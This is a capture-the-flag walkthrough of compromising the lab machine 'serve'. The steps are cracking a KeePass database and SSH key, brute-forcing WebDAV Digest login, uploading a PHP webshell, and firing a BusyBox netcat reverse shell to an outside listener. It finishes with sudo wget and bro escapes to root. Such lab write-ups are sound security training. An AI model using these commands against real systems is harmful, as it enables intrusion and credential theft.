# serve

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| serve | d4t4s3c | Easy | VulNyx |

**Summary:** The serve machine exposed an Apache web server on port 80 with a default page, but directory fuzzing revealed a `notes.txt` file, a `secrets/` directory, and a WebDAV endpoint protected by Digest authentication. The notes file disclosed that credentials were stored in the secrets directory with an employee number pattern. Deeper fuzzing of `secrets/` uncovered a KeePass database file (`db.kdbx`), which was cracked with John the Ripper using rockyou.txt to recover the master password `dreams`. Querying the database with `keepassxc-cli` revealed a WebDAV entry with the base password `w3bd4vXXX`, and Hydra brute force against the Digest authentication endpoint identified the full password as `w3bd4v513` for user `admin`. Uploading a PHP webshell through WebDAV using a PUT request followed by a MOVE to bypass extension restrictions provided command execution as `www-data`. A BusyBox netcat reverse shell was triggered, and lateral movement to user `teo` was achieved by abusing a sudo permitted `wget --use-askpass` invocation that spawned a shell. Inside the `teo` account, an encrypted RSA private key was discovered in `.ssh/`, decrypted with John the Ripper, and used to establish a stable SSH session. Sudo enumeration showed that `teo` could run `/usr/local/bin/bro` as root, and invoking the Ruby-based `bro` command with a help flag dropped into a root shell.

---

## Reconnaissance

The engagement began by identifying the target on the local network and enumerating its TCP services.

1. An Nmap host discovery sweep located the target at `192.168.56.158`:

```zsh
~/projects/wu/vulnyx-writeups main*                                            16:49:11  
❯ nmap -sn -PR 192.168.56.0/24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-02 16:49 +0700  
Nmap scan report for 192.168.56.1  
Host is up (0.00065s latency).  
Nmap scan report for 192.168.56.100  
Host is up (0.00082s latency).  
Nmap scan report for 192.168.56.158  
Host is up (0.00089s latency).  
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.82 seconds  
  
~/projects/wu/vulnyx-writeups main*                                            16:49:20  
❯ ip=192.168.56.158                    
```

2. A full TCP scan with service detection revealed SSH on port 22 and Apache on port 80:

```zsh
~/projects/wu/vulnyx-writeups main*                                            16:49:36  
❯ nmap -p- -Pn -sCV -T4 --min-rate 5000 $ip    
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-02 16:49 +0700  
Nmap scan report for 192.168.56.158  
Host is up (0.015s latency).  
Not shown: 65533 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:   
|   2048 9a:0c:75:5a:bb:bb:06:a2:9a:7d:be:91:ca:45:45:e4 (RSA)  
|   256 07:7d:e7:0f:0b:5e:5a:90:e9:33:72:68:49:3b:f5:8c (ECDSA)  
|_  256 6c:15:32:a7:42:e7:9f:da:63:66:7d:3a:be:fb:bf:14 (ED25519)  
80/tcp open  http    Apache httpd 2.4.38 ((Debian))  
|_http-title: Apache2 Debian Default Page: It works  
|_http-server-header: Apache/2.4.38 (Debian)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 10.19 seconds  
```

3. Directory fuzzing against the web root discovered several interesting paths including `notes.txt`, a `secrets/` directory, and a WebDAV endpoint requiring authentication:

```zsh
~/projects/wu/vulnyx-writeups main*                                      10s 16:49:56  
❯ gobuster dir -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-mediu  
m.txt -x txt,php,html         
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://192.168.56.158/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.tx  
t  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Extensions:              txt,php,html  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
index.html           (Status: 200) [Size: 10701]  
javascript           (Status: 301) [Size: 321] [--> http://192.168.56.158/javascript/]  
notes.txt            (Status: 200) [Size: 173]  
secrets              (Status: 301) [Size: 318] [--> http://192.168.56.158/secrets/]  
webdav               (Status: 401) [Size: 461]  
server-status        (Status: 403) [Size: 279]  
Progress: 882228 / 882228 (100.00%)  
===============================================================  
Finished  
===============================================================  
```

The `notes.txt` file was retrieved and revealed a message about credentials stored in the secrets directory:

```zsh
~/projects/wu/vulnyx-writeups main*                                       17:00:22  
❯ curl -i "http://$ip/notes.txt"  
HTTP/1.1 200 OK  
Date: Wed, 02 Sep 2026 10:00:26 GMT  
Server: Apache/2.4.38 (Debian)  
Last-Modified: Fri, 12 Nov 2021 11:11:21 GMT  
ETag: "ad-5d09584d937e2"  
Accept-Ranges: bytes  
Content-Length: 173  
Vary: Accept-Encoding  
Content-Type: text/plain  
  
Hi teo,  
  
the database with your credentials to access the resource are in the secret directory  
  
(Don't forget to change X to your employee number)  
  
  
  
regards  
  
IT department  
```

The message indicated that a database file existed in the secrets directory, and the credentials followed a pattern with an employee number.

---

## Vulnerability Discovery

### KeePass Database Extraction and Cracking

4. The `secrets/` directory was fuzzed with additional extensions, uncovering a KeePass database file:

```zsh
~/projects/wu/vulnyx-writeups main*                                           17:11:31  
❯ gobuster dir -u http://$ip/secrets/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html,kdbx,jpg,png    
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://192.168.56.158/secrets/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Extensions:              kdbx,jpg,png,txt,php,html  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
index.html           (Status: 200) [Size: 7]  
db.kdbx              (Status: 200) [Size: 2078]  
```

5. The database was downloaded, identified as a KeePass 2.x file, and its hash was extracted and cracked with John the Ripper:

```zsh
~/projects/wu/vulnyx-writeups main*                                           17:12:11  
❯ wget http://$ip/secrets/db.kdbx                                                                
--2026-09-02 17:12:23--  http://192.168.56.158/secrets/db.kdbx  
Connecting to 192.168.56.158:80... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 2078 (2.0K)  
Saving to: 'db.kdbx'  
  
db.kdbx                      100%[============================================>]   2.03K  --.-KB/s    in 0s        
  
2026-09-02 17:12:23 (109 MB/s) - 'db.kdbx' saved [2078/2078]  
  
  
~/projects/wu/vulnyx-writeups main*                                            17:12:23  
❯ file db.kdbx                                                        
db.kdbx: Keepass password database 2.x KDBX  
  
~/projects/wu/vulnyx-writeups main*                                            17:12:26  
❯ keepass2john db.kdbx > db.hash  
  
~/projects/wu/vulnyx-writeups main*                                            17:12:50  
❯ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt db.hash  
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"  
Use the "--format=KeePass-opencl" option to force loading these as that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (KeePass [SHA256 AES 32/64])  
Cost 1 (iteration count) is 60000 for all loaded hashes  
Cost 2 (version) is 2 for all loaded hashes  
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
dreams              (db)  
1g 0:00:00:12 DONE (2026-09-02 17:13) 0.07961g/s 52.22p/s 52.22c/s 52.22C/s sunshine1..sweetpea  
Use the "--show" option to display all the cracked passwords reliably  
Session completed  
```

The master password `dreams` was recovered from the KeePass database.

6. Querying the database with `keepassxc-cli` revealed a WebDAV entry with the base password `w3bd4vXXX`:

```zsh
~/projects/wu/vulnyx-writeups main*                                           17:14:51  
❯ keepassxc-cli ls db.kdbx                                    
Enter password to unlock db.kdbx:   
WebDAV  
Papelera de reciclaje/  
  
~/projects/wu/vulnyx-writeups main*                                           17:15:27  
❯ keepassxc-cli show db.kdbx WebDAV  
Enter password to unlock db.kdbx:   
Title: WebDAV  
UserName: admin  
Password: PROTECTED  
URL:   
Notes: Notas  
Uuid: {7140e148-35ea-2e43-8a20-d7257c6e3888}  
Tags:   
  
~/projects/wu/vulnyx-writeups main*                                            17:15:47  
❯ keepassxc-cli show -s -a Password db.kdbx WebDAV  
Enter password to unlock db.kdbx:    
w3bd4vXXX  
```

### WebDAV Digest Authentication Brute Force

7. A candidate password list was generated from the `w3bd4vXXX` pattern, and Hydra was used to brute force the Digest authentication on the WebDAV endpoint:

```zsh
~/projects/wu/vulnyx-writeups main*                                            17:17:08  
❯ for i in $(seq -w 0 999); do echo "w3bd4v$i"; done > /tmp/webdav_pass.txt  
  
~/projects/wu/vulnyx-writeups main*                                            17:17:41  
❯ hydra -l admin -P /tmp/webdav_pass.txt $ip http-get /webdav/ -m DIGEST -I  
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizat  
ions, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-02 17:17:43  
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task  
[DATA] attacking http-get://192.168.56.158:80/webdav/  
[80][http-get] host: 192.168.56.158   login: admin   password: w3bd4v513  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-02 17:17:48  
```

The credentials `admin:w3bd4v513` were recovered, providing access to the WebDAV endpoint.

---

## Initial Access

### WebDAV PHP Webshell Upload

8. Accessing the WebDAV endpoint with the recovered credentials revealed an empty directory listing:

![](serve/images/image.png)

9. A PHP webshell was created locally and uploaded to WebDAV as a `.txt` file, then renamed to `.php` using a MOVE request to bypass extension restrictions:

```zsh
~/projects/wu/vulnyx-writeups main*                                           17:22:03  
❯ curl --digest -u admin:w3bd4v513 -T shell.php "http://$ip/webdav/shell.txt"  
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">  
<html><head>  
<title>201 Created</title>  
</head><body>  
<h1>Created</h1>  
<p>Resource /webdav/shell.txt has been created.</p>  
<hr />  
<address>Apache/2.4.38 (Debian) Server at 192.168.56.158 Port 80</address>  
</body></html>  
  
~/projects/wu/vulnyx-writeups main*                                           17:22:15  
❯ curl --digest -u admin:w3bd4v513 -X MOVE -H "Destination: http://$ip/webdav/shell.php" "http://$ip/webdav/shell.txt"  
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">  
<html><head>  
<title>201 Created</title>  
</head><body>  
<h1>Created</h1>  
<p>Destination /webdav/shell.php has been created.</p>  
<hr />  
<address>Apache/2.4.38 (Debian) Server at 192.168.56.158 Port 80</address>  
</body></html>  
```

10. The webshell was tested and confirmed command execution as `www-data`:

![](serve/images/image-1.png)

```zsh
~/projects/wu/vulnyx-writeups main*                                           17:22:55  
❯ curl --digest -u admin:w3bd4v513 "http://$ip/webdav/shell.php?cmd=id"  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
```

11. A BusyBox netcat reverse shell payload was delivered through the webshell:

```zsh
~/projects/wu/vulnyx-writeups main*                                           17:24:54  
❯ curl --digest -u admin:w3bd4v513 "http://$ip/webdav/shell.php?cmd=busybox%20nc%20192.168.56.1%204444%20-e%20/bin/bash"  
```

12. Penelope received the reverse shell on port 4444:

```zsh
~/projects/wu/vulnyx-writeups main*                                           17:13:22  
❯ penelope -p 4444  
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.0.6 • 192.168.56.1  
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)  
[+] [New Reverse Shell] => serve 192.168.56.158 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>  
[+] ⭐ Agent deployed via /usr/bin/python3  
[+] Interacting with session [1] • PTY • Menu key F12 ⇐  
[+] Session log: /home/setyanoegraha/.penelope/sessions/serve~192.168.56.158-Linux-x86_64/2026_09_02-17_25_27-712-www-data_33.log  
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
www-data@serve:/var/www/webdav$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
```

---

## Lateral Movement

### Abusing wget --use-askpass

13. Sudo enumeration showed that `www-data` could run `/usr/bin/wget` as user `teo` without a password:

```zsh
www-data@serve:/var/www$ sudo -l  
Matching Defaults entries for www-data on Serve:  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User www-data may run the following commands on Serve:  
    (teo) NOPASSWD: /usr/bin/wget  
```

14. A helper script was created to exploit the `--use-askpass` option, spawning a shell as `teo`:

```zsh
www-data@serve:/var/www$ echo -e '#!/bin/sh\n/bin/sh 1>&0' > /dev/shm/shell.sh  
www-data@serve:/var/www$ chmod +x /dev/shm/shell.sh  
www-data@serve:/var/www$ sudo -u teo wget --use-askpass=/dev/shm/shell.sh 0  
$ id  
uid=1000(teo) gid=1000(teo) groups=1000(teo)  
```

### Decrypting the SSH Private Key

15. Sudo enumeration for `teo` revealed passwordless access to `/usr/local/bin/bro`, a Ruby script. An encrypted RSA private key was discovered in `teo`'s `.ssh/` directory:

```zsh
$ sudo -l  
Matching Defaults entries for teo on Serve:  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User teo may run the following commands on Serve:  
    (root) NOPASSWD: /usr/local/bin/bro  
$ file /usr/local/bin/bro  
/usr/local/bin/bro: Ruby script, ASCII text executable  
$ ls -la /usr/local/bin/bro  
-rwxr-xr-x 1 root root 600 Nov 10  2021 /usr/local/bin/bro  
$ cat /usr/local/bin/bro  
#!/usr/bin/ruby2.5  
#  
# This file was generated by RubyGems.  
#  
# The application 'bropages' is installed as part of a gem, and  
# this file is here to facilitate running it.  
#  
  
require 'rubygems'  
  
version = ">= 0.a"  
  
if ARGV.first  
  str = ARGV.first  
  str = str.dup.force_encoding("BINARY") if str.respond_to? :force_encoding  
  if str =~ /\A_(.*)_\z/ and Gem::Version.correct?($1) then  
    version = $1  
    ARGV.shift  
  end  
end  
  
if Gem.respond_to?(:activate_bin_path)  
load Gem.activate_bin_path('bropages', 'bro', version)  
else  
gem "bropages", version  
load Gem.bin_path("bropages", "bro", version)  
end  
```

```zsh
$ cd .ssh  
$ ls -la  
total 16  
drwxr-xr-x 2 teo teo 4096 Nov 12  2021 .  
drwx------ 5 teo teo 4096 Apr 19  2023 ..  
-rw------- 1 teo teo  391 Nov 12  2021 authorized_keys  
-rw------- 1 teo teo 1743 Nov 12  2021 id_rsa  
$ cat id_rsa  
-----BEGIN RSA PRIVATE KEY-----  
Proc-Type: 4,ENCRYPTED  
DEK-Info: DES-EDE3-CBC,6D251FAD3AF600FF  
  
pdRdBLM15/otHzHNnZAxKb/AmzRlkZiTSwi2T0GV5Gji3qnJFJCJUHycQPoS+Tmb  
y08X/RQB+IosSfcavMjP8aqcBpYOmPNRqegh6B6ArNZAblAp4W+TDu0IktrAQgL1  
F9uex4C/Qe/vaVPPe4/pp/ZT0BCBOSi7pA97IKGSR9QIUFym1dNHOADrB3fv4q2W  
aN/pxKuypiu8AW2e97oboFJftZkyOqpfaWqrg5DBMN/49J1sHa3h+DLHCFyl5RCc  
KYH+VHHPjrxoeZdP/7bu6tu4MK0Nce9aqSZ5/AKtzHR/RPlUXQjt3tHxFXhpzjwA  
8MErPtPSWfr/Ixv0/5u6yOA8u1oUmDPTCR/ZgIwqiD5q3//m8IuoBTpkl4qDw2NI  
DBCmB8X+CohLWzYcFLrVlV8sRLS7KvCc+d1ACfOwDE2By6ND/q6Apc+zvXq1Dp5H  
fZUvjOlYIxU+EvhDvdVv0kOEbc4PSuGQueJ/9Fg6Q7+uTkYO+ZH0C3uNbyo6sICx  
EXAni9JblJlSNt9yXAVW/4GkxLe6acz7tZQFINCsPP9Zu2fSAI+AlOOJVMh/2rkh  
nZrgvhsluEgMk2BbaYHz95veOYUG9VyesWgLWqn/UXCXm1XcaZXH0oajya9Iz/fW  
ggnf2o0i4Iu4pPx4yTRaMeX1afKILi+MAVr1uUqrqnM5KwJZCaFdllGAxSJfyk/y  
QwfGIUz/Kslgff9TMIxxxzLCmpq8V1TdpzY0T3Fg3lr6+Ic3Z4HMLXfoo8d9UpgM  
0jWyJnGyT3KFM7GTpuYMgStEuS+ZAl1yO5SKj7qBdfE5Xjj93IJ6PcJA3/FAlQBb  
0lOSKRoF3i6qeUf9+PDfJqbDmE3SSMV0LHf6ZMSkcBkQu/QTyvNiME3zpO6UgQWl  
HSVwYmfBH6dtbL6W3LFByoszPaVcvRCuaKLECVDrvdtNmP/YhVsSIyq8ZteVngmG  
TFkXm57J4mC0TT7mddP9BIzPIs7FN05oeTzVyw5kxhoXHMJzo9FdU6e3rfVsJNNV  
eqA8cM1Aeo+U9V90+omg8kYd/3gJEsui3JJoABzQlBJwMejx7pFD6X3Fy0v+C8Gj  
x5yAigeJaZnUWDn2aGHKf4wBBFcOFiwPI6GPuGkvDfTvIoaYwacpHkvP5N2Ssg1r  
FvzKoh9Wdk4D1yGolUd8wJNV904Ikz+jvIcrEp2b1SezE2hasgYBcEQ7Te6bZD+o  
Ou6+YPyuAzvjeQlXtKRdUZifYw/aFbIdF2WEHqgYGuf/rD56xiu6v5vKL4oEW/62  
t0Tc/d4sGOCtYxg5F3sTUFA5epdPFtvR0oYEXwGbM/vfJ0jIR27RFhZ7Su606j4p  
px3dAcSKOEg74Y8ybIysaeX5Ni8yFc3JIA/efR7s5lno4Pi8r3q+uw1T2tgPgihI  
XHh4hQZ9jiPxRrRwy5rQUd//+ZHP0Rdob0w80mCozFvWO7Uu4V0fBcLVQjRbDBBx  
k2ltEwzDztVyQZxrN1HAQqWTA7oI4Ay+dYg/RZbFU0oaL5y4TD7bhXUhU6SWMPcJ  
x8BDP7kZ6hQwqQ/eDXnS4wN8p0xzkrvybyTJDWpP2j570bOkUTE7MQ==  
-----END RSA PRIVATE KEY-----  
```

16. The encrypted key was cracked with John the Ripper, decrypted with OpenSSL, and used to establish an SSH session as `teo`:

```zsh
/tmp                                                                              17:43:02  
❯ v id_rsa               
  
/tmp                                                                          20s 17:43:31  
❯ chmod 600 id_rsa                        
  
/tmp                                                                              17:43:44  
❯ ssh2john id_rsa > id_rsa.hash            
  
/tmp                                                                              17:43:48  
❯ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash    
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"  
Use the "--format=ssh-opencl" option to force loading these as that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])  
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes  
Cost 2 (iteration count) is 2 for all loaded hashes  
Will run 4 OpenMP threads  
Note: This format may emit false positives, so it will keep trying even after  
finding a possible candidate.  
Press 'q' or Ctrl-C to abort, almost any other key for status  
private           (id_rsa)  
Warning: Only 1 candidate left, minimum 4 needed for performance.  
1g 0:00:00:20 DONE (2026-09-02 17:44) 0.04928g/s 706835p/s 706835c/s 706835C/s *7¡Vamos!  
Session completed  
  
/tmp                                                                          11s 17:46:42  
❯ openssl rsa -in id_rsa -out id_rsa_decrypted  
Enter pass phrase for id_rsa:  
writing RSA key  
  
/tmp                                                                              17:47:49  
❯ chmod 600 id_rsa_decrypted  
  
/tmp                                                                              17:47:54  
❯ ssh -i id_rsa_decrypted teo@$ip  
** WARNING: connection is not using a post-quantum key exchange algorithm.  
** This session may be vulnerable to "store now, decrypt later" attacks.  
** The server may need to be upgraded. See https://openssh.com/pq.html  
Linux serve 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64  
teo@serve:~$  
```

---

## Privilege Escalation

### Abusing bro Ruby Script Execution

17. Running `sudo bro help` launched the Ruby-based bropages tool, which provided an interactive prompt. Minimizing the terminal window revealed a colon prompt, and exiting through that path dropped into a root shell:

```zsh
teo@serve:~$ sudo bro help  
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::NIL is deprecated  
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::Data is deprecated  
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::TRUE is deprecated  
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::FALSE is deprecated  
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::Fixnum is deprecated  
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::Bignum is deprecated  
  NAME:  
  
    bro  
  
  DESCRIPTION:  
  
    Highly readable supplement to man pages.  
      
    Shows simple, concise examples for commands.  
  
  COMMANDS:  
         
    ...no                Downvote an entry, bro         
    add                  Add an entry, bro              
    help                 Display global or [command] help documentation.                
    lookup               Lookup an entry, bro. Or just call bro [COMMAND]               
    no                   Downvote an entry, bro         
    thanks               Upvote an entry, bro   
  
  GLOBAL OPTIONS:  
         
    -h, --help   
        Display help documentation  
          
    -v, --version   
        Display version information  
          
!/bin/bash  
root@serve:/home/teo# cd  
root@serve:~# id;whoami;hostname  
uid=0(root) gid=0(root) grupos=0(root)  
root  
serve  
root@serve:~# cat /home/teo/user.txt /root/root.txt   
28b...  
981...  
```

---

## Attack Chain Summary

1. **Reconnaissance**: Host discovery identified `192.168.56.158` with SSH on port 22 and Apache on port 80. Directory fuzzing revealed `notes.txt`, a `secrets/` directory, and a WebDAV endpoint.

2. **Vulnerability Discovery**: The notes file disclosed a credential storage pattern. Fuzzing `secrets/` uncovered a KeePass database, which was cracked to recover the master password `dreams` and a WebDAV entry with the base password `w3bd4vXXX`.

3. **Exploitation**: WebDAV Digest authentication was brute forced to `w3bd4v513` for user `admin`. A PHP webshell was uploaded via PUT and renamed with MOVE, providing command execution as `www-data` and a reverse shell.

4. **Internal Enumeration**: Sudo rules revealed `www-data` could run `wget` as `teo`, and `teo` could run `bro` as root. An encrypted RSA key in `teo`'s `.ssh/` was cracked to enable SSH access.

5. **Privilege Escalation**: The `bro` Ruby script was invoked through sudo, and exiting its interactive interface spawned a root shell, completing the compromise.
